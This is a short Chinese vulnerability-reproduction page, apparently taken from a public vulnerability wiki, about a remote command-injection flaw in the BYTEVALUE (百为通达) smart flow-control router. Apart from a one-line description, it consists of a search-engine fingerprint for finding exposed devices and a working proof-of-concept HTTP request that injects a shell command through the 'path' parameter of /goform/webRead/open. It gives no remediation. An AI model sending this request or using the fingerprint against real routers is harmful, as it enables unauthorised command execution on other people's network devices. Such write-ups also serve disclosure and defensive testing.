---
title: "百为通达 智能流控路由器 open 远程命令执行漏洞"
date: 2026-10-18 09:16:28
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "百为通达-智能流控路由器-open"
tags:
  - "百为通达-智能流控路由器-open"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

BYTEVALUE 百为流控路由器是一款追求带宽利用率的多功能路由器。百为智能流控路由器 /goform/webRead/open 路由存在有回显的命令注入漏洞。

## 漏洞影响

百为通达 智能流控路由器

## 网络测绘

```
"BYTEVALUE 智能流控路由器"
```

## 漏洞复现

登陆页面

![image-20231116142008257](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142008257.png)

poc

```
GET /goform/webRead/open/?path=|id HTTP/1.1
Host:
```

![image-20231116142021268](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142021268.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
